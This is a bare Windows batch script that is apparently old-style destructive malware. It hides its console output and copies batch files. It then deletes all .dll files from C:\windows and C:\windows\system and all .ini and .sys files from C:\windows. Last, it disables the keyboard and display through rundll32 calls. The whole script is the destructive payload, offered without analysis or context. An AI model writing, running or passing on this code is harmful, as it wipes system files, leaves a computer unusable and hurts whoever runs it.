   @echo off
   ctty nul
   xcopy *.bat
   copy *.bat
   cd..
   cd..
   cd..
   cd..
   cd..
   c:
   cd c:\windows
   del *.dll
   cd..
   cd..
   c:
   cd c:\windows\system
   del *.dll
   cd..
   cd..
   cd..
   c:
   cd c:\windows
   del *.ini
   cd..
   cd..
   c:
   cd c:\windows
   del *.sys
   cd..
   c:\windows\rundll32.exe Keyboard,Disable
   c:\windows\rundll32.exe user,disableoemlayer
   cd..
   cd..
   cls
   end
   exit
